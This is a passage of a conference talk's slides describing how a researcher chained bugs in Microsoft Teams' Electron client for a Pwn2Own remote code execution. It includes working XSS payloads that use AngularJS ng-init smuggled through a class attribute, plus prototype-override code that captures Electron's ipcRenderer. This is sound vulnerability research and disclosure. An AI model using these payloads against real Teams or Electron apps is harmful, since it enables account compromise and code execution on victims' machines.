  

Clipped from: [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)

1. [![How I Hacked
    Microsoft Teams
    and got $150,000
    in Pwn2Own
    2023/7/25 Shibuya.XSS techtalk #12 Masato Kinugawa](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_0.jpg?26545065)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_0.jpg?26545065)
    
    How I Hacked  
    Microsoft Teams  
    and got $150,000  
    in Pwn2Own  
    2023/7/25 Shibuya.XSS techtalk #12 Masato Kinugawa  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_0.jpg)
    
2. [![whoami
    • Masato Kinugawa
    • I like XSS
    • 2010～2016: Full-time bug bounty hunter
    • 2016～: Pentester of Cure53](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_1.jpg?26545066)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_1.jpg?26545066)
    
    whoami  
    • Masato Kinugawa  
    • I like XSS  
    • 2010～2016: Full-time bug bounty hunter  
    • 2016～: Pentester of Cure53  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_1.jpg)
    
3. [![Today's topic
    • Technical details of vulnerabilities allowing RCE in Microsoft
    Teams
    • I found them for Pwn2Own which was held in May 2022 and won
    • Non-technical topics about my experience with the contest
    can be heard in the following podcasts (* in Japanese)
    https://podcasters.spotify.com/pod/show/shhnjk/episodes/Web-e1s9jjl/a-a923e6v](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_2.jpg?26545067)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_2.jpg?26545067)
    
    Today's topic  
    • Technical details of vulnerabilities allowing RCE in Microsoft  
    Teams  
    • I found them for Pwn2Own which was held in May 2022 and won  
    • Non-technical topics about my experience with the contest  
    can be heard in the following podcasts (* in Japanese)  
    https://podcasters.spotify.com/pod/show/shhnjk/episodes/Web-e1s9jjl/a-a923e6v  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_2.jpg)
    
4. [![Pwn2Own?
    • Hacking contest by Trend Micro's ZDI(Zero Day Initiative)
    • Held since 2007
    • Goal: Find specific target's (mainly) RCE and make the
    demo successful within the defined time limit → $$$
    • That day's demo： https://youtu.be/3fWo0E6Pa34?t=238
    • The found vulns are notified to the vendor](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_3.jpg?26545068)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_3.jpg?26545068)
    
    Pwn2Own?  
    • Hacking contest by Trend Micro's ZDI(Zero Day Initiative)  
    • Held since 2007  
    • Goal: Find specific target's (mainly) RCE and make the  
    demo successful within the defined time limit → $$$  
    • That day's demo： https://youtu.be/3fWo0E6Pa34?t=238  
    • The found vulns are notified to the vendor  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_3.jpg)
    
5. [![Target examples
    (in case of Pwn2Own Vancouver 2022)
    • Browser (Chrome, Edge, Firefox, Safari)
    • Desktop app (Teams, Zoom, Adobe Reader, Office 365)
    • Car (Tesla)
    • VM(Virtual Box, VMware, Hyper-V)
    • Server(Microsoft Exchange, SharePoint, Windows RDP, Samba)
    • OS(Windows, Ubuntu)
    Pwn2Own Vancouver 2022 Rules (Web Archive):
    https://web.archive.org/web/20220516223600/https://www.zerodayiniti
    ative.com/Pwn2OwnVancouver2022Rules.html](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_4.jpg?26545069)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_4.jpg?26545069)
    
    Target examples  
    (in case of Pwn2Own Vancouver 2022)  
    • Browser (Chrome, Edge, Firefox, Safari)  
    • Desktop app (Teams, Zoom, Adobe Reader, Office 365)  
    • Car (Tesla)  
    • VM(Virtual Box, VMware, Hyper-V)  
    • Server(Microsoft Exchange, SharePoint, Windows RDP, Samba)  
    • OS(Windows, Ubuntu)  
    Pwn2Own Vancouver 2022 Rules (Web Archive):  
    https://web.archive.org/web/20220516223600/https://www.zerodayiniti  
    ative.com/Pwn2OwnVancouver2022Rules.html  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_4.jpg)
    
6. [![Microsoft Teams?
    • Needless to say, communication tool that enables chat or
    video calls developed by Microsoft
    • There are two versions and different technology is used
    • 1.x: Electron ← Contest Target
    • 2.x: Edge WebView](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_5.jpg?26545070)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_5.jpg?26545070)
    
    Microsoft Teams?  
    • Needless to say, communication tool that enables chat or  
    video calls developed by Microsoft  
    • There are two versions and different technology is used  
    • 1.x: Electron ← Contest Target  
    • 2.x: Edge WebView  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_5.jpg)
    
7. [![Three bugs I found
    1. Lack of Context Isolation in main window
    2. XSS via chat message
    3. JS execution via PluginHost outside sandbox
    ➡ I achieved RCE by combining these bugs](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_6.jpg?26545071)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_6.jpg?26545071)
    
    Three bugs I found  
    1. Lack of Context Isolation in main window  
    2. XSS via chat message  
    3. JS execution via PluginHost outside sandbox  
    ➡ I achieved RCE by combining these bugs  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_6.jpg)
    
8. [![Bug #1
    1. Lack of Context Isolation in main window
    2. XSS via chat message
    3. JS execution via PluginHost outside sandbox](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_7.jpg?26545072)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_7.jpg?26545072)
    
    Bug #1  
    1. Lack of Context Isolation in main window  
    2. XSS via chat message  
    3. JS execution via PluginHost outside sandbox  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_7.jpg)
    
9. [![Electron?
    • Framework for creating desktop applications with HTML,
    CSS and JavaScript (Node.js)
    • Developed by GitHub
    • Examples of Electron app
    • Visual Studio Code
    • Discord
    • Slack
    • GitHub Desktop
    • Figma](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_8.jpg?26545073)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_8.jpg?26545073)
    
    Electron?  
    • Framework for creating desktop applications with HTML,  
    CSS and JavaScript (Node.js)  
    • Developed by GitHub  
    • Examples of Electron app  
    • Visual Studio Code  
    • Discord  
    • Slack  
    • GitHub Desktop  
    • Figma  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_8.jpg)
    
10. [![Electron basics
    const {BrowserWindow,app} = require('electron');
    app.on('ready', function() {
    let win = new BrowserWindow();
    //Open Renderer Process
    win.loadURL(`file://${__dirname}/index.html`);
    });
    <h1>Hello Electron!</h1>
    Main process Renderer process
    main.js: index.html:
    • Electron has two types of processes
    • Browser part: Chromium](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_9.jpg?26545074)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_9.jpg?26545074)
    
    Electron basics  
    const {BrowserWindow,app} = require('electron');  
    app.on('ready', function() {  
    let win = new BrowserWindow();  
    //Open Renderer Process  
    win.loadURL(`file://${__dirname}/index.html`);  
    });  
      
      
    Hello Electron!  
      
      
    Main process Renderer process  
    main.js: index.html:  
    • Electron has two types of processes  
    • Browser part: Chromium  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_9.jpg)
    
11. [![The first part to check
    const {BrowserWindow,app} = require('electron');
    app.on('ready', function() {
    let win = new BrowserWindow();
    //Open Renderer Process
    win.loadURL(`file://${__dirname}/index.html`);
    });
    <h1>Hello Electron!</h1>
    Main process Renderer process
    main.js:
    I always check this
    index.html:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_10.jpg?26545075)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_10.jpg?26545075)
    
    The first part to check  
    const {BrowserWindow,app} = require('electron');  
    app.on('ready', function() {  
    let win = new BrowserWindow();  
    //Open Renderer Process  
    win.loadURL(`file://${__dirname}/index.html`);  
    });  
      
      
    Hello Electron!  
      
      
    Main process Renderer process  
    main.js:  
    I always check this  
    index.html:  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_10.jpg)
    
12. [![BrowserWindow
    • API for creating browser window
    • Focus on options for this API
    • depending on the options, determine how RCE can be caused
    new BrowserWindow({
    webPreferences: {
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: true
    [...]
    }
    });
    Important options：](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_11.jpg?26545076)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_11.jpg?26545076)
    
    BrowserWindow  
    • API for creating browser window  
    • Focus on options for this API  
    • depending on the options, determine how RCE can be caused  
    new BrowserWindow({  
    webPreferences: {  
    nodeIntegration: false,  
    contextIsolation: false,  
    sandbox: true  
    [...]  
    }  
    });  
    Important options：  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_11.jpg)
    
13. [![nodeIntegration
    • Whether Node APIs (and Electorn's renderer process modules)
    are enabled on web page
    • If "true" and arbitrary JS exec is possible, RCE is possible just
    using require():
    require('child_process').exec('calc');
    false is used](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_12.jpg?26545077)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_12.jpg?26545077)
    
    nodeIntegration  
    • Whether Node APIs (and Electorn's renderer process modules)  
    are enabled on web page  
    • If "true" and arbitrary JS exec is possible, RCE is possible just  
    using require():  
    require('child_process').exec('calc');  
    false is used  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_12.jpg)
    
14. [![contextIsolation
    • Whether to separate the JS context between the web
    page and part that allows node APIs
    • Part that allows node APIs:
    • Electron internal JS code
    • Preload scripts
    What happens if "false"? ➡
    false is used](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_13.jpg?26545078)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_13.jpg?26545078)
    
    contextIsolation  
    • Whether to separate the JS context between the web  
    page and part that allows node APIs  
    • Part that allows node APIs:  
    • Electron internal JS code  
    • Preload scripts  
    What happens if "false"? ➡  
    false is used  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_13.jpg)
    
15. [![If contextIsolation:fase
    • When arbitrary JS exec is possible, Node API can be accessed,
    e.g. via overridden prototype (even if nodeIntegration:false)
    //Web page
    Function.prototype.call = function(arg) {
    arg.someDangerousNodeJSFunction();
    }
    // Preload script or Electron internal code
    function someFunc(handler) {
    handler.call(objectContainingNodeJSFeature);
    }](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_14.jpg?26545079)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_14.jpg?26545079)
    
    If contextIsolation:fase  
    • When arbitrary JS exec is possible, Node API can be accessed,  
    e.g. via overridden prototype (even if nodeIntegration:false)  
    //Web page  
    Function.prototype.call = function(arg) {  
    arg.someDangerousNodeJSFunction();  
    }  
    // Preload script or Electron internal code  
    function someFunc(handler) {  
    handler.call(objectContainingNodeJSFeature);  
    }  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_14.jpg)
    
16. [![If contextIsolation:false
    //Web page
    Function.prototype.call = function(arg) {
    arg.someDangerousNodeJSFunction();
    }
    // Preload script or Electron internal code
    function someFunc(handler) {
    handler.call(objectContainingNodeJSFeature);//called
    }
    • When arbitrary JS exec is possible, Node API can be accessed,
    e.g. via overridden prototype (even if nodeIntegration:false)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_15.jpg?26545080)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_15.jpg?26545080)
    
    If contextIsolation:false  
    //Web page  
    Function.prototype.call = function(arg) {  
    arg.someDangerousNodeJSFunction();  
    }  
    // Preload script or Electron internal code  
    function someFunc(handler) {  
    handler.call(objectContainingNodeJSFeature);//called  
    }  
    • When arbitrary JS exec is possible, Node API can be accessed,  
    e.g. via overridden prototype (even if nodeIntegration:false)  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_15.jpg)
    
17. [![If contextIsolation:true
    • The overridden prototype does not affect JavaScript on
    different context and RCE through this trick is prevented
    //Web page
    Function.prototype.call = function(arg) {
    arg.someDangerousNodeJSFunction();
    }
    // Preload script or Electron internal code
    function someFunc(handler) {
    handler.call(objectContainingNodeJSFeature);//called
    }
    Built-in Function.prototype.call is called](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_16.jpg?26545081)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_16.jpg?26545081)
    
    If contextIsolation:true  
    • The overridden prototype does not affect JavaScript on  
    different context and RCE through this trick is prevented  
    //Web page  
    Function.prototype.call = function(arg) {  
    arg.someDangerousNodeJSFunction();  
    }  
    // Preload script or Electron internal code  
    function someFunc(handler) {  
    handler.call(objectContainingNodeJSFeature);//called  
    }  
    Built-in Function.prototype.call is called  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_16.jpg)
    
18. [![sandbox
    • Whether to use Chromium's sandbox
    • false is the same as running Chrome with --no-sandbox flag
    • If false, it makes RCE easier via bugs such as memory corruption
    • In addition, if true, some APIs become unavailable in a
    context where the Node APIs are available , e.g:
    • APIs executing OS command/program (e.g. shell.openExternal)
    • APIs accessing clipboard without confirmation (clipboard module)
    • APIs accessing local files
    true is used](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_17.jpg?26545082)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_17.jpg?26545082)
    
    sandbox  
    • Whether to use Chromium's sandbox  
    • false is the same as running Chrome with --no-sandbox flag  
    • If false, it makes RCE easier via bugs such as memory corruption  
    • In addition, if true, some APIs become unavailable in a  
    context where the Node APIs are available , e.g:  
    • APIs executing OS command/program (e.g. shell.openExternal)  
    • APIs accessing clipboard without confirmation (clipboard module)  
    • APIs accessing local files  
    true is used  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_17.jpg)
    
19. [![What can be said from used options
    new BrowserWindow({
    webPreferences: {
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: true
    }
    });
    ➡ When arbitrary JS exec is possible, due to sandbox, JS can't
    access Node APIs which lead to RCE directly but due to the lack of
    context isolation, other Node APIs may be accessible.](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_18.jpg?26545083)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_18.jpg?26545083)
    
    What can be said from used options  
    new BrowserWindow({  
    webPreferences: {  
    nodeIntegration: false,  
    contextIsolation: false,  
    sandbox: true  
    }  
    });  
    ➡ When arbitrary JS exec is possible, due to sandbox, JS can't  
    access Node APIs which lead to RCE directly but due to the lack of  
    context isolation, other Node APIs may be accessible.  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_18.jpg)
    
20. [![Trying to access interesting Node APIs
    • When I'm trying to get an interesting reference to exploitable
    Node API by overriding prototype of various built-in
    methods...
    • ipcRenderer module's reference came from overridden
    Function.prototype.call
    Function.prototype._call = Function.prototype.call;
    Function.prototype.call = function(...args) {
    if (args[3] && args[3].name === "__webpack_require__") {
    ipc = args[3]('./lib/sandboxed_renderer/api/exports/electron.ts').ipcRenderer;
    }
    return this._call(...args);
    }](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_19.jpg?26545084)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_19.jpg?26545084)
    
    Trying to access interesting Node APIs  
    • When I'm trying to get an interesting reference to exploitable  
    Node API by overriding prototype of various built-in  
    methods...  
    • ipcRenderer module's reference came from overridden  
    Function.prototype.call  
    <br/>Function.prototype._call = Function.prototype.call;<br/>Function.prototype.call = function(...args) {<br/>if (args[3] && args[3].name === "__webpack_require__") {<br/>ipc = args[3]('./lib/sandboxed_renderer/api/exports/electron.ts').ipcRenderer;<br/>}<br/>return this._call(...args);<br/>}<br/>  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_19.jpg)
    
21. [![ipcRenderer module
    const { ipcMain } = require('electron');
    [...]
    ipcMain.handle('test', (evt, msg) => {
    console.log(msg);//hello
    return 'hey';
    });
    <h1>Hello Electron!</h1>
    Main process
    main.js:
    index.html:
    It is used to communicate between renderer and main process
    const { ipcRenderer } = require('electron');
    ipcRenderer.invoke('test','hello');
    .then(msg=>{
    console.log(msg);//hey
    });
    preload.js:
    ➡Main process has full access to Node APIs, so
    it may lead to RCE if there is an IPC listener which doesn't have proper validation
    Renderer process](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_20.jpg?26545085)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_20.jpg?26545085)
    
    ipcRenderer module  
    const { ipcMain } = require('electron');  
    [...]  
    ipcMain.handle('test', (evt, msg) => {  
    console.log(msg);//hello  
    return 'hey';  
    });  
    Hello Electron!  
    Main process  
    main.js:  
    index.html:  
    It is used to communicate between renderer and main process  
    const { ipcRenderer } = require('electron');  
    ipcRenderer.invoke('test','hello');  
    .then(msg=>{  
    console.log(msg);//hey  
    });  
    preload.js:  
    ➡Main process has full access to Node APIs, so  
    it may lead to RCE if there is an IPC listener which doesn't have proper validation  
    Renderer process  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_20.jpg)
    
22. [![Given the fact so far
    1 Find a way to exec arbitrary JS, e.g.:
    • XSS
    • Redirect to arbitrary site
    2 Find a part that leads to RCE, e.g.:
    • Find IPC listener which leads to RCE through ipcRenderer module
    retrieved from 1's js exec
    • Find exposed API which leads to RCE directly even if sandbox:true (In
    other words, find Electron 0-day)
    Now, I know the main window does not have contextIsolation and
    I can get ipcRenderer reference. The next thing to do is:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_21.jpg?26545086)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_21.jpg?26545086)
    
    Given the fact so far  
    1 Find a way to exec arbitrary JS, e.g.:  
    • XSS  
    • Redirect to arbitrary site  
    2 Find a part that leads to RCE, e.g.:  
    • Find IPC listener which leads to RCE through ipcRenderer module  
    retrieved from 1's js exec  
    • Find exposed API which leads to RCE directly even if sandbox:true (In  
    other words, find Electron 0-day)  
    Now, I know the main window does not have contextIsolation and  
    I can get ipcRenderer reference. The next thing to do is:  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_21.jpg)
    
23. [![Bug #2
    1. Lack of Context Isolation in main window
    2. XSS via chat message
    3. JS execution via PluginHost outside sandbox](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_22.jpg?26545087)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_22.jpg?26545087)
    
    Bug #2  
    1. Lack of Context Isolation in main window  
    2. XSS via chat message  
    3. JS execution via PluginHost outside sandbox  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_22.jpg)
    
24. [![Ideas to execute arbitrary JS
    • XSS
    • Redirect to arbitrary site
    • The origin where the JS is executed is not important here
    • Because it allows interfering the part that uses Node APIs and
    achieving RCE if even arbitrary JS can be executed
    • In addition, according to the rules of Pwn2Own, it is necessary
    to achieve RCE without user interaction
    I decided to take a closer look at chat messages ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_23.jpg?26545088)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_23.jpg?26545088)
    
    Ideas to execute arbitrary JS  
    • XSS  
    • Redirect to arbitrary site  
    • The origin where the JS is executed is not important here  
    • Because it allows interfering the part that uses Node APIs and  
    achieving RCE if even arbitrary JS can be executed  
    • In addition, according to the rules of Pwn2Own, it is necessary  
    to achieve RCE without user interaction  
    I decided to take a closer look at chat messages ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_23.jpg)
    
25. [![Checking HTML sanitizer
    • The chat allows users to use
    some HTML/CSS
    • It displays HTML after sanitizing
    both on server and client-side
    ➡ The sever-side sanitization is black-box, so
    I decided to check the client-side and try to guess the behavior](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_24.jpg?26545089)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_24.jpg?26545089)
    
    Checking HTML sanitizer  
    • The chat allows users to use  
    some HTML/CSS  
    • It displays HTML after sanitizing  
    both on server and client-side  
    ➡ The sever-side sanitization is black-box, so  
    I decided to check the client-side and try to guess the behavior  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_24.jpg)
    
26. [![Sanitization in client-side
    • sanitize-html library is used https://github.com/apostrophecms/sanitize-html
    • Examples of what is sanitized:
    • HTML elements/attributes allowing script exec(XSS)
    • CSS allowing breaking layouts
    Unexpectedly, checking sanitization around CSS here led to the
    discovery of XSS...➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_25.jpg?26545090)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_25.jpg?26545090)
    
    Sanitization in client-side  
    • sanitize-html library is used https://github.com/apostrophecms/sanitize-html  
    • Examples of what is sanitized:  
    • HTML elements/attributes allowing script exec(XSS)  
    • CSS allowing breaking layouts  
    Unexpectedly, checking sanitization around CSS here led to the  
    discovery of XSS...➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_25.jpg)
    
27. [![Sanitization for class attr
    • I found class attr's allow-list-ish string in client-side JS code:
    e.htmlClasses = "swift-*,ts-image*,
    emojione,emoticon-*,animated-emoticon-*,
    copy-paste-table,hljs*,language-*,zoetrope,
    me-email-*,quoted-reply-color-*"
    • Actually, these classes were not removed by server/client-side
    sanitization
    • Looks like the asterisk part works as a wildcard](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_26.jpg?26545091)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_26.jpg?26545091)
    
    Sanitization for class attr  
    • I found class attr's allow-list-ish string in client-side JS code:  
    e.htmlClasses = "swift-*,ts-image*,  
    emojione,emoticon-*,animated-emoticon-*,  
    copy-paste-table,hljs*,language-*,zoetrope,  
    me-email-*,quoted-reply-color-*"  
    • Actually, these classes were not removed by server/client-side  
    sanitization  
    • Looks like the asterisk part works as a wildcard  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_26.jpg)
    
28. [![Behavior of wildcard (swift-*)
    • Looks like anything except class attr's separator (e.g. 0x20) is
    included there
    <strong class="swift-abc">test</strong>
    <strong class="swift-;[]()'%">test</strong>
    But...due to a certain JS resource,
    it leads to JS exec?! ➡
    It's okay because arbitrary class name is not added?](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_27.jpg?26545092)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_27.jpg?26545092)
    
    Behavior of wildcard (swift-*)  
    • Looks like anything except class attr's separator (e.g. 0x20) is  
    included there  
    test  
    test  
    But...due to a certain JS resource,  
    it leads to JS exec?! ➡  
    It's okay because arbitrary class name is not added?  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_27.jpg)
    
29. [![A certain JS resource = AngularJS
    • Teams used AngularJS as a client-side Framework in some
    pages
    • The chat message part is one of them
    • These days it seems to be gradually being replaced by React
    Speaking of AngularJS... ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_28.jpg?26545093)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_28.jpg?26545093)
    
    A certain JS resource = AngularJS  
    • Teams used AngularJS as a client-side Framework in some  
    pages  
    • The chat message part is one of them  
    • These days it seems to be gradually being replaced by React  
    Speaking of AngularJS... ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_28.jpg)
    
30. [![XSSer ♥ AngularJS
    • AngularJS is very useful library for XSSer
    • Without using HTML tags, XSS is allowed via {{}} templates:
    • It introduces CSP bypass even if unsafe-eval is not set:
    <div>
    {{constructor.constructor('alert(1)')()}}
    </div>
    <div>
    <img src="x">
    </div>](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_29.jpg?26545094)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_29.jpg?26545094)
    
    XSSer ♥ AngularJS  
    • AngularJS is very useful library for XSSer  
    • Without using HTML tags, XSS is allowed via {{}} templates:  
    • It introduces CSP bypass even if unsafe-eval is not set:  
      
      
    {{constructor.constructor('alert(1)')()}}  
      
      
      
      
      
      
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_29.jpg)
    
31. [![XSS found in the past
    • Actually, XSS via AngularJS in MS Teams was found by
    security researchers in the past
    • It occurred due to a template string filter bypass by inserting
    a null char between {{}}
    {{3*333}\u0000}
    Details: https://github.com/oskarsve/ms-teams-rce
    The fact that this XSS occurs on single-page app is that probably Teams dynamically compiles
    user-input as AngularJS HTML (like inside ng-app attr)?
    I thought AngularJS XSS might still occur in other ways.
    When trying to find interesting features through AngularJS official doc,
    found this ...➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_30.jpg?26545095)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_30.jpg?26545095)
    
    XSS found in the past  
    • Actually, XSS via AngularJS in MS Teams was found by  
    security researchers in the past  
    • It occurred due to a template string filter bypass by inserting  
    a null char between {{}}  
    {{3*333}\u0000}  
    Details: https://github.com/oskarsve/ms-teams-rce  
    The fact that this XSS occurs on single-page app is that probably Teams dynamically compiles  
    user-input as AngularJS HTML (like inside ng-app attr)?  
    I thought AngularJS XSS might still occur in other ways.  
    When trying to find interesting features through AngularJS official doc,  
    found this ...➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_30.jpg)
    
32. [![ngInit directive (1/2)
    • It is used for init process before executing {{}} template
    • "Hello World!" is displayed from this:
    <strong>
    {{greeting}} {{person}}!
    </strong>
    <strong></strong>
    This attr's value is evaluated as AngularJS expression, so JS works via:
    ng-init attribute is of course sanitized. But...➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_31.jpg?26545096)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_31.jpg?26545096)
    
    ngInit directive (1/2)  
    • It is used for init process before executing {{}} template  
    • "Hello World!" is displayed from this:  
      
      
      
    {{greeting}} {{person}}!  
      
      
      
    This attr's value is evaluated as AngularJS expression, so JS works via:  
    ng-init attribute is of course sanitized. But...➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_31.jpg)
    
33. [![ngInit directive (2/2)
    • ngInit can be used via class attr also
    • The following are the same:
    <div>
    <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
    </div>
    ... 
    ... 
    Official doc: https://docs.angularjs.org/api/ng/directive/ngInit
    The following code is also interpreted as AngularJS expression:
    ➡ JS exec via class attribute!!
    * ng-class, ng-style, etc. also can be used in the same way](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_32.jpg?26545097)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_32.jpg?26545097)
    
    ngInit directive (2/2)  
    • ngInit can be used via class attr also  
    • The following are the same:  
      
      
    aaa  
      
    ...  
    ...  
    Official doc: https://docs.angularjs.org/api/ng/directive/ngInit  
    The following code is also interpreted as AngularJS expression:  
    ➡ JS exec via class attribute!!  
    * ng-class, ng-style, etc. also can be used in the same way  
    
